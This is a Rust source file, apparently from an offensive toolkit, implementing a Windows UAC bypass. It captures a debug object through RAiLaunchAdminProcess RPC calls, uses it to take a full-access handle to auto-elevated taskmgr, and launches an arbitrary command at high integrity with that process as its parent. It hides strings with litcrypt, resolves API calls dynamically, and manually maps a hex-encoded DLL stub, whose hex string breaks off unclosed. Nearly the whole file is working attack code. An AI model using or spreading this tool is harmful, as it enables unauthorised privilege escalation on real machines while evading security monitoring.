#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use std::{ptr, mem::size_of};

use data::{APP_STARTUP_INFO, APP_PROCESS_INFORMATION, PVOID, DBGUI_WAIT_STATE_CHANGE, THREAD_ALL_ACCESS, DbguiCreateProcess, STARTUPINFOEXW,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, EXTENDED_STARTUPINFO_PRESENT, CREATE_UNICODE_ENVIRONMENT, DEBUG_PROCESS, PROCESS_DEBUG_OBJECT_HANDLE, CREATE_NEW_CONSOLE};
use winapi::um::winnt::LARGE_INTEGER;
use windows::Win32::{Foundation::{HANDLE, BOOL}, System::Threading::PROCESS_INFORMATION};


pub fn spawn_elevated_process(command: String, new_console: bool) -> bool
{
    unsafe
    {

        let unelevated = lc!("c:\\windows\\system32\\notepad.exe");
        let elevated = lc!("c:\\windows\\system32\\taskmgr.exe");
        // We dynamically get ntdll and kernel32 base addresses.
        let ntdll = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
        let k32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));
        let rpc_stub = get_rpc_stub();
        // The C++ dll is decoded and manually mapped in runtime.
        let decoded_stub = hex::decode(rpc_stub).expect(&lc!("[x] Decoding failed"));
        let mapped_stub = manualmap::manually_map_module(decoded_stub.as_ptr()).unwrap();
 

        let rai_launch_admin_process_ptr: data::RAiLaunchAdminProcess;
        let rai_launch_admin_process_r: Option<i32>;
        let mut path: Vec<u16> = unelevated.encode_utf16().collect();
        path.push(0);
        let admin = 0i32;
        let flags: i32 = (CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS) as i32;
        let mut current_directory: Vec<u16> = "c:\\".encode_utf16().collect();
        current_directory.push(0);
        let mut winstation: Vec<u16> = "WinSta0\\Default".encode_utf16().collect();
        winstation.push(0);
        let startup_info: *mut APP_STARTUP_INFO = std::mem::transmute(&APP_STARTUP_INFO::default());
        let process_information: *mut APP_PROCESS_INFORMATION = std::mem::transmute(&APP_PROCESS_INFORMATION::default());
        let returned: *mut i32 = std::mem::transmute(&i32::default());
        
        // First RPC to RAiLaunAdminProcess. This will spawn an unelevated Notepad process in debug mode. 
        dinvoke::dynamic_invoke!(mapped_stub.1,&lc!("Proc0_RAiLaunchAdminProcess"),rai_launch_admin_process_ptr,rai_launch_admin_process_r,ptr::null_mut(),
        path.as_ptr() as *mut u16,path.as_ptr() as *mut u16,admin,flags,current_directory.as_ptr() as *mut u16,winstation.as_ptr() as *mut u16,startup_info,
        0,-1,process_information,returned); 

        if rai_launch_admin_process_r.unwrap() != 0
        {
            println!("{}", lc!("[x] RPC to RAiLaunchAdminProcess failed."));
            return false;
        }

        println!("{}", lc!("[+] Unelevatad notepad.exe process created."));

        let unelevated_handle = HANDLE {0: (*process_information).process_handle as isize};
        let debug_object = HANDLE::default();
        let dbg_ptr: PVOID = std::mem::transmute(&debug_object);
        let _unused: *mut u32 = std::mem::transmute(&u32::default());

        // We obtain a reference to the debug object stored on the TEB of the RPC server thread that have spawned the Notepad process.
        let ntstatus = dinvoke::nt_query_information_process(unelevated_handle, PROCESS_DEBUG_OBJECT_HANDLE,
            dbg_ptr, size_of::<HANDLE>() as u32, _unused);

        if ntstatus != 0
        {
            println!("{}", lc!("[x] Could not retrieve debug object."));
            return false;
        }

        println!("{}", lc!("[+] Reference to debug object retrieved."));

        let nt_terminate_process_ptr: data::NtTerminateProcess;
        let nt_terminate_process_r: Option<i32>;
        dinvoke::dynamic_invoke!(ntdll,&lc!("NtTerminateProcess"),nt_terminate_process_ptr,nt_terminate_process_r,unelevated_handle,0);

        if nt_terminate_process_r.unwrap() != 0
        {
            println!("{}", lc!("[x] Could not kill the unelevated process."));
            return false;
        }

        let nt_remove_process_debug: data::NtRemoveProcessDebug;
        let nt_remove_process_debug_r: Option<i32>;
        // We detach the debug object, so it won't get more events coming from the unelevated process. However, the object is already created and it will
        // be reused to debug any other process that the same RPC server thread spawns.
        dinvoke::dynamic_invoke!(ntdll,&lc!("NtRemoveProcessDebug"),nt_remove_process_debug,nt_remove_process_debug_r,unelevated_handle,debug_object);

        if nt_remove_process_debug_r.unwrap() != 0
        {
            println!("{}", lc!("[x] Could not detach the debug object."));
            return false;
        }

        println!("{}", lc!("[+] Debug object successfully detached."));

        let rai_launch_admin_process_ptr: data::RAiLaunchAdminProcess;
        let rai_launch_admin_process_r: Option<i32>;
        let mut path: Vec<u16> = elevated.encode_utf16().collect();
        path.push(0);
        let admin = 1i32; // Spawn the process elevated
        let flags: i32 = (CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS) as i32;
        let mut current_directory: Vec<u16> = "c:\\".encode_utf16().collect();
        current_directory.push(0);
        let mut winstation: Vec<u16> = "WinSta0\\Default".encode_utf16().collect();
        winstation.push(0);
        let startup_info: *mut APP_STARTUP_INFO = std::mem::transmute(&APP_STARTUP_INFO::default());
        let process_information: *mut APP_PROCESS_INFORMATION = std::mem::transmute(&APP_PROCESS_INFORMATION::default());
        let returned: *mut i32 = std::mem::transmute(&i32::default());
        
        // The second RPC to RAiLaunchAdminProcess uses an auto elevated binary like taskmgr to spawn an elevated process without UAC dialog.
        // This process will be spawned in debug mode and will share the same debug object previously created.
        dinvoke::dynamic_invoke!(mapped_stub.1,&lc!("Proc0_RAiLaunchAdminProcess"),rai_launch_admin_process_ptr,rai_launch_admin_process_r,ptr::null_mut(),
        path.as_ptr() as *mut u16,path.as_ptr() as *mut u16,admin,flags,current_directory.as_ptr() as *mut u16,winstation.as_ptr() as *mut u16,startup_info,
        0,-1,process_information,returned); 

        if rai_launch_admin_process_r.unwrap() != 0
        {
            println!("{}", lc!("[x] RPC call to RAiLaunchAdminProcess failed."));
            return false;
        }

        println!("{}", lc!("[+] Elevated taskmgr.exe process created."));

        let nt_wait_for_debug: data::NtWaitForDebugEvent;
        let nt_wait_for_debug_r: Option<i32>;
        let _timeout = vec![0u8;size_of::<LARGE_INTEGER>()];
        let timeout: *mut LARGE_INTEGER = std::mem::transmute(_timeout.as_ptr());
        let wait_state_change: PVOID = std::mem::transmute(&DBGUI_WAIT_STATE_CHANGE::default());

        // Since we have a reference to the debug object, we can obtain the initial process creation debug event of the elevated process.
        dinvoke::dynamic_invoke!(ntdll,&lc!("NtWaitForDebugEvent"),nt_wait_for_debug,nt_wait_for_debug_r,debug_object,0,timeout,wait_state_change);

        if nt_wait_for_debug_r.unwrap() != 0
        {
            println!("{}", lc!("[x] Initial process creation debug event not received."));
            return false;
        }

        println!("{}", lc!("[+] Initial process creation debug event obtained."));

        let state_change: *mut DBGUI_WAIT_STATE_CHANGE = std::mem::transmute(wait_state_change);
        let elevated_process_handles: *mut DbguiCreateProcess = std::mem::transmute(&(*state_change).state_info);
        
        let current_process_handle = HANDLE {0: -1};
        let _handle = HANDLE::default();
        let duplicated_handle: *mut HANDLE = std::mem::transmute(&_handle);

        // The handle obtained from the initial process creation debug event does not have full access permission over the elevated process.
        // However, we can abuse the Duplicate Handles permission to obtain a full access handle.
        let x = dinvoke::nt_duplicate_object(
            (*elevated_process_handles).process_handle,
            current_process_handle,
            current_process_handle,
            duplicated_handle,
            THREAD_ALL_ACCESS,
            0,
            0
        );

        if x != 0
        {
            println!("{}", lc!("[x] Failed to obtain a full access handle to the elevated process."));
            return false;
        }

        println!("{}", lc!("[+] Full access handle obtained."));

        let nt_terminate_process_ptr: data::NtTerminateProcess;
        let nt_terminate_process_r: Option<i32>;
        dinvoke::dynamic_invoke!(ntdll,&lc!("NtTerminateProcess"),nt_terminate_process_ptr,nt_terminate_process_r,(*elevated_process_handles).process_handle,0);

        if nt_terminate_process_r.unwrap() != 0
        {
            println!("{}", lc!("[x] Could not kill the unelevated process."));
            return false;
        }

        let nt_remove_process_debug: data::NtRemoveProcessDebug;
        let nt_remove_process_debug_r: Option<i32>;
        dinvoke::dynamic_invoke!(ntdll,&lc!("NtRemoveProcessDebug"),nt_remove_process_debug,nt_remove_process_debug_r,*duplicated_handle,debug_object);

        if nt_remove_process_debug_r.unwrap() != 0
        {
            println!("{}", lc!("[x] Could not detach the debug object."));
            return false;
        }

        // Once we have a full access handle to the elevated taskmgr process, we can set it as parent process handle at the time of spawning our new process.
        // This way we complete the UAC bypass and we are able to spawn a process with high integrity and full administrator privileges.
        let initialize_attribute_list: data::InitializeProcThreadAttributeList;
        let _initialize_attribute_list_r: Option<BOOL>;
        let size: *mut usize = std::mem::transmute(&usize::default());
        dinvoke::dynamic_invoke!(k32,&lc!("InitializeProcThreadAttributeList"),initialize_attribute_list,_initialize_attribute_list_r,ptr::null_mut(),1,0,size);
        let startup = vec![0u8;size_of::<STARTUPINFOEXW>()];
        let list = vec![0u8;*size];
        let startupinfoex: *mut STARTUPINFOEXW = std::mem::transmute(startup.as_ptr());
        (*startupinfoex).lpAttributeList = std::mem::transmute(list.as_ptr());
        let initialize_attribute_list: data::InitializeProcThreadAttributeList;
        let initialize_attribute_list_r: Option<BOOL>;
        dinvoke::dynamic_invoke!(k32,&lc!("InitializeProcThreadAttributeList"),initialize_attribute_list,initialize_attribute_list_r,(*startupinfoex).lpAttributeList,1,0,size);

        if !initialize_attribute_list_r.unwrap().as_bool()
        {
            println!("{}", lc!("[x] Something went wrong."));
            return false;
        }
        
        let update_attribute_list: data::UpdateProcThreadAttribute;
        let update_attribute_list_r: Option<BOOL>;
        let parent_process: PVOID = std::mem::transmute(duplicated_handle);
        dinvoke::dynamic_invoke!(k32,&lc!("UpdateProcThreadAttribute"),update_attribute_list,update_attribute_list_r,(*startupinfoex).lpAttributeList,
        0,PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,parent_process,size_of::<HANDLE>(),ptr::null_mut(),ptr::null());

        if !update_attribute_list_r.unwrap().as_bool()
        {
            println!("{}", lc!("[x] Something went wrong."));
            return false;
        }

        (*startupinfoex).StartupInfo.cb = size_of::<STARTUPINFOEXW>() as u32;

        let create_process: data::CreateProcessW;
        let create_process_r: Option<BOOL>;
        let process_information: *mut PROCESS_INFORMATION = std::mem::transmute(&PROCESS_INFORMATION::default());
        let mut path: Vec<u16> = command.encode_utf16().collect();
        path.push(0);
        let mut flags = EXTENDED_STARTUPINFO_PRESENT;
        if new_console
        {
            flags |= CREATE_NEW_CONSOLE;
        }

        dinvoke::dynamic_invoke!(k32,&lc!("CreateProcessW"),create_process,create_process_r,ptr::null_mut(),path.as_ptr() as *mut u16,ptr::null(),ptr::null(),
        BOOL{0: 0},flags,ptr::null(),ptr::null(),startupinfoex,process_information);
        
        if !create_process_r.unwrap().as_bool()
        {
            println!("{}", lc!("[x] The new process could not be spawned."));
            return false;
        }                    
    }
    
    true
}

fn get_rpc_stub() -> String {
    
    let bytes = lc!("4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000000100000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000eec09eb5aaa1f0e6aaa1f0e6aaa1f0e6a3d963e6aea1f0e6f8d4f1e7a8a1f0e6f8d4f5e7a0a1f0e6f8d4f4e7a2a1f0e6f8d4f3e7a9a1f0e6becaf1e7afa1f0e6aaa1f1e68da1f0e668d4f9e7a9a1f0e668d4f0e7aba1f0e668d40fe6aba1f0e668d4f2e7aba1f0e652696368aaa1f0e6000000000000000000000000000000005045000064860600b23907630000000000000000f00022200b020e1d001000000024000000000000d01400000010000000000080010000000010000000020000060000000000000006000000000000000080000000040000000000000200600100001000000000000010000000000000000010000000000000100000000000000000000010000000b030000058000000083100007800000000600000f800000000500000c8010000000000000000000000700000a0000000342a000070000000000000000000000000000000000000000000000000000000b02a000038010000000000000000000000200000200100000000000000000000000000000000000000000000000000002e74657874000000d80f0000001000000010000000040000000000000000000000000000200000602e72646174610000b2150000002000000016000000140000000000000000000000000000400000402e64617461000000580600000040000000020000002a0000000000000000000000000000400000c02e70646174610000c80100000050000000020000002c0000000000000000000000000000400000402e72737263000000f80000000060000000020000002e0000000000000000000000000000400000402e72656c6f630000a00000000070000000020000003000000000000000000000000000004000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048895c240855565741544155415641574881eca0000000488b05ea2f00004833c448898424900000004c8bb42408010000488d842480000000488bac2410010000488d0d98110000488bb42418010000458be9488bbc24300100004c8d0d5e110000488b9c24380100004d8be04c8bfa48894424284c8d054411000048c744242000000000488d153c110000ff15fe0f0000488b8c2480000000488d942488000000ff15d00f0000488d8c2480000000ff15ca0f00008b842428010000488d0dcc1800004c8b8c24880000004533c048895c247033d248897c246889442460488b84242001000048894424588b842400010000488974245048896c24484c897424408944243844896c24304c896424284c897c2420ff156d0f0000488b8c24900000004833cce865000000488b9c24e00000004881c4a0000000415f415e415d415c5f5e5dc3cccccccccccccccccccc48ff25690f0000cccccccccccccccccc48ff25610f0000ccccccccccccccccccb801000000c3cccccccccccccccccccccccccccccccc66660f1f840000000000483b0d712e0000751048c1c11066f7c1ffff7501c348c1c910e996030000cccc4883ec2885d2743983ea01742883ea01741683fa01740ab8010000004883c428c3e85a060000eb05e82b0600000fb6c04883c428c3498bd04883c428e90f0000004d85c00f95c14883c428e91801000048895c2408488974241048897c242041564883ec20488bf24c8bf133c9e8ca06000084c00f84c8000000e8510500008ad88844244040b701833da1330000000f85c5000000c7059133000001000000e89c05000084c0744fe8ab090000e8d6040000e8fd040000488d15f20e0000488d0de30e0000e8de0b000085c07529e83905000084c07420488d15c20e0000488d0db30e0000e8b80b0000c7053c330000020000004032ff8acbe8ae0700004084ff753fe8f4070000488bd8488338007424488bc8e8fb06000084c074184c8bc6ba02000000498bce488b034c8b0d4e0e000041ffd1ff05552d0000b801000000eb0233c0488b5c2430488b742438488b7c24484883c420415ec3b907000000e8a807000090cccccc48895c2408574883ec30408af98b05152d000085c07f0d33c0488b5c24404883c4305fc3ffc88905fc2c0000e8370400008ad888442420833d8a320000027537e84b050000e8e6030000e8dd080000832572320000008acbe8e706000033d2408acfe801070000f6d81bdb83e301e84d0500008bc3eba2b907000000e8230700009090cc488bc4488958204c89401889501048894808565741564883ec40498bf08bfa4c8bf185d2750f3915782c00007f0733c0e9ee0000008d42ff83f8017745488b05b00d00004885c0750ac744243001000000eb14ff153b0d00008bd88944243085c00f84b20000004c8bc68bd7498bcee8a0fdffff8bd88944243085c00f84970000004c8bc68bd7498bcee845fdffff8bd88944243083ff01753685c075324c8bc633d2498bcee829fdffff4885f60f95c1e8c6feffff488b05370d00004885c0740e4c8bc633d2498bceff15c40c000085ff740583ff0375404c8bc68bd7498bcee82efdffff8bd88944243085c07429488b05fd0c00004885c075098d5801895c2430eb144c8bc68bd7498bceff15810c00008bd889442430eb0633db895c24308bc3488b5c24784883c440415e5f5ec3cccccc48895c24084889742410574883ec20498bf88bda488bf183fa017505e89b0100004c8bc78bd3488bce488b5c2430488b7424384883c4205fe98ffeffffcccccc40534883ec20488bd933c9ff15470b0000488bcbff15ee0a0000ff15300b0000488bc8ba090400c04883c4205b48ff25140b000048894c24084883ec38b917000000ff15f80a000085c07407b902000000cd29488d0d862b0000e8a9000000488b4424384889056d2c0000488d4424384883c008488905fd2b0000488b05562c0000488905c72a0000488b442440488905cb2b0000c705a12a0000090400c0c7059b2a000001000000c705a52a000001000000b808000000486bc000488d0d9d2a000048c7040102000000b808000000486bc000488b0d1d2a000048894c0420b808000000486bc001488b0d002a000048894c0420488d0d8c0b0000e8fffeffff4883c438c3cccc405356574883ec40488bd9ff15170a0000488bb3f800000033ff4533c0488d542460488bceff15c50900004885c07439488364243800488d4c2468488b5424604c8bc848894c24304c8bc6488d4c247048894c242833c948895c2420ff1596090000ffc783ff027cb14883c4405f5e5bc3cccccc48895c242055488bec4883ec20488b056829000048bb32a2df2d992b0000483bc375744883651800488d4d18ff1572090000488b451848894510ff156c0900008bc048314510ff15280900008bc0488d4d2048314510ff15600900008b4520488d4d1048c1e02048334520483345104833c148b9ffffffffffff00004823c148b933a2df2d992b0000483bc3480f44c1488905e5280000488b5c244848f7d0488905ce2800004883c4205dc3488d0d812e000048ff25e2080000cccc488d0d712e0000e9f2060000488d05752e0000c3488d05752e0000c34883ec28e8e7ffffff48830824e8e6ffffff488308024883c428c3cc4883ec28e89f06000085c0742165488b042530000000488b4808eb05483bc8741433c0f0480fb10d3c2e000075ee32c04883c428c3b001ebf7cccccc4883ec28e86306000085c07407e8b6040000eb19e89bf9ffff8bc8e88806000085c0740432c0eb07e881060000b0014883c428c34883ec2833c9e83d01000084c00f95c04883c428c3cccccc4883ec28e87306000084c0750432c0eb12e86606000084c07507e85d060000ebecb0014883c428c34883ec28e84b060000e846060000b0014883c428c3cccccc48895c240848896c24104889742418574883ec20498bf9498bf08bda488be9e8bc05000085c0751683fb0175114c8bc633d2488bcd488bc7ff15aa080000488b5424588b4c2450488b5c2430488b6c2438488b7424404883c4205fe9b60500004883ec28e87705000085c07410488d0d3c2d00004883c428e9b1050000e8be05000085c07505e8a90500004883c428c34883ec2833c9e8a10500004883c428e99805000040534883ec200fb605f72c000085c9bb010000000f44c38805e72c0000e876030000e87105000084c0750432c0eb14e86405000084c0750933c9e859050000ebea8ac34883c4205bc3cccccc40534883ec20803dac2c0000008bd9756783f901776ae8d504000085c0742885db7524488d0d962c0000e80905000085c07510488d0d9e2c0000e8f904000085c0742e32c0eb33660f6f05290800004883c8fff30f7f05652c00004889056e2c0000f30f7f056e2c0000488905772c0000c605412c000001b0014883c4205bc3b905000000e8fa000000cccc4883ec184c8bc1b84d5a000066390529e6ffff757848630d5ce6ffff488d1519e6ffff4803ca813950450000755fb80b0200006639411875544c2bc20fb74114488d51184803d00fb74106488d0c804c8d0cca48891424493bd174188b4a0c4c3bc1720a8b420803c14c3bc072084883c228ebdf33d24885d2750432c0eb14837a24007d0432c0eb0ab001eb0632c0eb0232c04883c418c340534883ec208ad9e8bf03000033d285c0740b84db75074887156e2b00004883c4205bc340534883ec20803d632b0000008ad9740484d2750ce8ea0300008acbe8e3030000b0014883c4205bc3cccccc488d059d2b0000c383256d2b000000c348895c240855488dac2440fbffff4881ecc00500008bd9b917000000ff157205000085c074048bcbcd29b903000000e8c4ffffff33d2488d4df041b8d0040000e84b030000488d4df0ff1535050000488b9de8000000488d95d8040000488bcb4533c0ff15e30400004885c0743c488364243800488d8de0040000488b95d80400004c8bc848894c24304c8bc3488d8de804000048894c2428488d4df048894c242033c9ff15aa040000488b85c8040000488d4c2450488985e800000033d2488d85c804000041b8980000004883c00848898588000000e8b4020000488b85c80400004889442460c744245015000040c744245401000000ff156604000083f801488d4424504889442440488d45f00f94c3488944244833c9ff158d040000488d4c2440ff153204000085c0750c84db75088d4803e8befeffff488b9c24d00500004881c4c00500005dc3cc48895c2408574883ec20488d1dc7120000488d3dc0120000eb12488b034885c07406ff15000500004883c308483bdf72e9488b5c24304883c4205fc348895c2408574883ec20488d1d9b120000488d3d94120000eb12488b034885c07406ff15c40400004883c308483bdf72e9488b5c24304883c4205fc3c20000cc48895c24104889742418574883ec1033c033c90fa2448bc14533db448bcb4181f06e74656c4181f147656e75448bd28bf033c9418d4301450bc80fa24181f2696e6549890424450bca895c24048bf9894c24088954240c755048830d3b230000ff25f03fff0f3dc006010074283d6006020074213d70060200741a05b0f9fcff83f820772448b90100010001000000480fa3c17314448b05182900004183c8014489050d290000eb07448b0504290000b807000000448d48fb3bf07c2633c90fa2890424448bdb895c2404894c24088954240c0fbae309730a450bc1448905d1280000c705a72200000100000044890da42200000fbae7140f839100000044890d8f220000bb06000000891d882200000fbae71b73790fbae71c737333c90f01d048c1e220480bd04889542420488b44242022c33ac375578b055a22000083c808c705492200000300000089054722000041f6c320743883c820c705302200000500000089052e220000b8000003d04423d8443bd87518488b44242024e03ce0750d830d0f22000040891d05220000488b5c242833c0488b7424304883c4105fc3cccccc33c03905002200000f95c0c3ccccccccccccccccccccccccff256a020000ff255c020000ff254e020000ff2588020000ff2592020000ff25ac020000ff258e020000ff2568020000ff2572020000ff258c020000ff257e020000ccccb001c3cc33c0c3cc4883ec284d8b4138488bca498bd1e80d000000b8010000004883c428c3cccccc4053458b18488bda4183e3f84c8bc941f600044c8bd17413418b40084d635004f7d84c03d14863c84c23d14963c34a8b1410488b43108b4808488b4308f64401030f740b0fb644010383e0f04c03c84c33ca498bc95be989f2ffffcccccccccccccccccccccccccccccc66660f1f840000000000ffe0cccccccccccccccccccccccccccccccccccccccc66660f1f840000000000ff25ea01000040554883ec20488bea8a4d404883c4205de900fbffffcc40554883ec20488bea8a4d20e8eefaffff904883c4205dc3cc40554883ec20488bea4883c4205de94ff9ffffcc40554883ec30488bea488b018b1048894c2428895424204c8d0d08f2ffff4c8b45708b5568488b4d60e890f8ffff904883c4305dc3cc4055488bea488b0133c98138050000c00f94c18bc15dc3cc0000000000000000000000000000000000000000000000000000000000000000000000000000000034350000000000006e3400000000000088340000000000009c3400000000000090350000000000007a3500000000000060350000000000004a350000000000005a340000000000001a35000000000000fe34000000000000ea34000000000000d634000000000000b8340000000000000000000000000000bc32000000000000dc32000000000000ee32000000000000a0320000000000000000000000000000443300000000000024330000000000000c33000000000000000000000000000060330000000000006a330000000000000000000000000000b8330000000000007233000000000000da330000000000007e330000000000009e330000000000000e34000000000000f6330000000000008c330000000000000000000000000000801c008001000000801c008001000000201f008001000000401f008001000000401f00800100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005040008001000000f0400080010000000000000000000000ffffffffffffffffffffffffffffffff00000000000000006e00630061006c0072007000630000000000000000000000320030003100650066003900390061002d0037006600610030002d0034003400340063002d0039003300390039002d003100390062006100380034006600310032006100310061000000000000000000045d888aeb1cc9119fe808002b10486002000000000000000000000000000000e2270080010000006027008001000000722700800100000000000000000000000000000000000000000000000000000033057171babe37498319b5dbef9ccc3601000000000000000000000000000000000000000000000068230080010000000000000000000000000000000000000000000000000000000000000000000000c02900800100000050110080010000006011008001000000404600800100000000000000000000000000000000000000000000000000000000000000000000007227008001000000010000000100060000000000000000006e020108000000000000000000000000000000000000000000000000000000000100000200000000000000000000000090290080010000000000000000000000a0230080010000004025008001000000a025008001000000002600800100000030260080010000003026008001000000702600800100000040000c01680000002800000068000000000000000c000800720000000000000080240080010000000b0000000800000080240080010000000b000000100000009925008001000000c8000000180000009925008001000000c80000002000000058270080010000000b0100002800000058270080010000000b0100003000000090240080010000000b010000380000009825008001000000c8000000400000009925008001000000c80000004800000090250080010000001281000050000000992500800100000050810000580000009925008001000000f00000006000000021000000000000005827008001000000350703003800000000000000000000000000000000000000302500800100000014000000000000000500000000000000050000000000000005000000000000000500000000000000050000000000000005000000000000000500000000000000050000000000000004000000000000009000020000000000050000000000000005000000000000009000040000000000920700000000000093000000000000002100000000000000582700800100000040000c012000000000000000480000000000000003000800720000000000000058270080010000000b01000008000000902500800100000012810000100000009925008001000000f0000000180000003007000018000000070500000000000040000c01280000001800000008000000000000000400080072000000000000009925008001000000c80000000800000058270080010000000b010000100000009825008001000000c8000000180000009925008001000000f00000002000000040000801100000000000000008000000000000000100080072000000000000009925008001000000f00000000800000040000801180000000800000008000000000000000200080072000000000000009925008001000000c8000000080000009925008001000000f00000001000000040000c01680000007800000008000000000000000c00080072000000000000009825008001000000c8000000080000009925008001000000c8000000100000009925008001000000c8000000180000009925008001000000c80000002000000058270080010000000b0100002800000050270080010000000a0100003000000058270080010000000b0100003800000058270080010000000b0100004000000058270080010000000b0100004800000058270080010000000b010000500000009925008001000000c8000000580000009925008001000000f00000006000000030030000100000006400020000000000000066009600cc00f0001a0144010000000000001208255c1108255c11000a001503080008085c5b1a03380000001400360808080808080808063e4c00e3ff405c5b1208255c110402001a03180000000000b9b908085c5b110c085c110008001d000800015b150310000806064c00f1ff5b00000000000000000000000000000000004800000000000068003200000020002400470c0a0100000000000000000b00080002000b00100002004800180008004800200008000b01280008000b01300008000b013800160048004000b90048004800080013615000380050215800080070006000080000480000000001002000320000000000080047030a0100000000000000000b010800080013611000380070001800080000480000000002002800320000001000080046040a0100000000000000004800080008000b011000080048001800b90070002000080000480000000003001000320000000000080044010a01000000000000000070000800080000480000000004001800320000000800080044020a01000000000000000048000800080070001000080000480000000005001800320000000800080044020a01000000000000000048000800080070001000080000480000000006006800320000006c000800460c0a01000000000000000048000800b9004800100008004800180008004800200008000b01280008000a01300054000b01380008000b01400008000b01480008000b015000080048005800080070006000080000000000d022008001000000e2270080010000006027008001000000202a00800100000002000000000000003022008001000000600000009af91e20a07f4c44939919ba84f12a1a01000000045d888aeb1cc9119fe808002b1048600200000000000000000000000000000000000000000000000000000000000000000000000000000090290080010000000000000200000000045d888aeb1cc9119fe808002b1048600200000000000000b2390763000000000200000050000000182c00001820000000000000b2390763000000000c00000014000000682c00006820000000000000b2390763000000000d000000580200007c2c00007c20000000000000b2390763000000000ec00800100000000000000000000000000000000000000282100800100000038210080010000004021008001000000304600800100000000000000000000000000000000000000000000000000000018000000008000800000000000000000000000000000000052534453cfb012149c3ca443bb493d7c75941db408000000433a5c55736572735c6375656e745c736f757263655c7265706f735c646c6c72735c7836345c52656c656173655c646c6c72732e7064620000000000150000001500000003000000120000004743544c00100000100f00002e74657874246d6e00000000101f0000360000002e74657874246d6e24303000461f0000920000002e7465787424780000200000200100002e696461746124350000000020210000280000002e3030636667000048210000080000002e435254245843410000000050210000080000002e4352542458435a0000000058210000080000002e435254245849410000000060210000080000002e4352542458495a0000000068210000080000002e435254245850410000000070210000080000002e4352542458505a0000000078210000080000002e435254245854410000000080210000100000002e4352542458545a0000000090210000700a00002e72646174610000002c0000180000002e726461746124766f6c746d64000000182c0000c00200002e7264617461247a7a7a646267000000d82e0000080000002e7274632449414100000000e02e0000080000002e72746324495a5a00000000e82e0000080000002e7274632454414100000000f02e0000080000002e72746324545a5a00000000f82e0000b80100002e78646174610000b0300000580000002e6564617461000008310000640000002e69646174612432000000006c310000140000002e696461746124330000000080310000200100002e6964617461243400000000a0320000120300002e696461746124360000000000400000400000002e6461746100000040400000180600002e6273730000000000500000c80100002e7064617461000000600000600000002e727372632430310000000060600000980000002e727372632430320000000000000000000000000000000000000000000000000000000000000000000000000000000019290b0017341c001701140010f00ee00cd00ac008700760065000008c1e000090000000000000000100000011150800157409001564070015340600153211e0401e00000200000038120000a7120000461f0000000000000a13000015130000461f0000000000000106020006320250110a04000a3408000a520670401e0000040000004f1300006e1300005d1f0000000000004413000086130000761f0000000000008f1300009a1300005d1f0000000000008f1300009b130000761f0000000000000104010004420000091a06001a340f001a7216e014701360401e000001000000d1130000b71400008a1f0000b71400000106020006520250010f06000f6407000f3406000f320b7001090100096200000108040008720470036002300106020006320230010d04000d3409000d3206500904010004220000401e000001000000cb190000551a0000c01f0000551a000001020100025000000114080014640800145407001434060014321070011505001534ba001501b80006500000010a04000a3406000a320670010f06000f6406000f3405000f120b700000000001000000000000000100000001020100023000000000000000000000ffffffff00000000e2300000010000000100000001000000d8300000dc300000e030000000100000ec3000000000646c6c72732e646c6c0050726f63305f5241694c61756e636841646d696e50726f6365737300f8310000000000000000000000330000782000002032000000000000000000004e330000a020000040320000000000000000000018340000c020000058320000000000000000000038340000d8200000803100000000000000000000a435000000200000000000000000000000000000000000000000000034350000000000006e3400000000000088340000000000009c3400000000000090350000000000007a3500000000000060350000000000004a350000000000005a340000000000001a35000000000000fe34000000000000ea34000000000000d634000000000000b8340000000000000000000000000000bc32000000000000dc32000000000000ee32000000000000a0320000000000000000000000000000443300000000000024330000000000000c33000000000000000000000000000060330000000000006a330000000000000000000000000000b8330000000000007233000000000000da330000000000007e330000000000009e330000000000000e34000000000000f6330000000000008c3300000000000000000000000000001002527063537472696e6742696e64696e67436f6d706f7365570000760152706342696e64696e6746726f6d537472696e6742696e64696e675700001402527063537472696e6746726565570000a4004e6472436c69656e7443616c6c3300005250435254342e646c6c000008005f5f435f73706563696669635f68616e646c6572000025005f5f7374645f747970655f696e666f5f64657374726f795f6c69737400003e006d656d7365740000564352554e54494d453134302e646c6c000019006d616c6c6f630000180066726565000036005f696e69747465726d0037005f696e69747465726d5f65003f005f7365685f66696c7465725f646c6c0018005f636f6e6669677572655f6e6172726f775f61726776000033005f696e697469616c697a655f6e6172726f775f656e7669726f6e6d656e74000034005f696e697469616c697a655f6f6e657869745f7461626c65000022005f657865637574655f6f6e657869745f7461626c650016005f636578697400006170692d6d732d77696e2d6372742d686561702d6c312d312d302e646c6c00006170692d6d732d77696e2d6372742d72756e74696d652d6c312d312d302e646c6c00d50452746c43617074757265436f6e7465787400dc0452746c4c6f6f6b757046756e6374696f6e456e7472790000e30452746c5669727475616c556e77696e640000c005556e68616e646c6564457863657074696f6e46696c74657200007f05536574556e68616e646c6564457863657074696f6e46696c74657200200247657443757272656e7450726f63657373009e055465726d696e61746550726f6365737300008c03497350726f636573736f724665617475726550726573656e740052045175657279506572666f726d616e6365436f756e74657200210247657443757272656e7450726f63657373496400250247657443757272656e7454687265616449640000f30247657453797374656d54696d65417346696c6554696d65006f03496e697469616c697a65534c697374486561640085034973446562756767657250726573656e74004b45524e454c33322e646c6c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000cd5d20d266d4ffff32a2df2d992b0000ffffffff0000000001000000020000002f2000000000000000ff82e000090110000ae110000202f0000b011000000120000bc2f00000012000016130000242f0000181300009c130000682f00009c130000cd140000c42f0000d01400000d150000f42f000010150000441500001830000044150000161600000430000018160000891600000c3000008c1600003817000020300000641700007f170000bc2f000080170000b9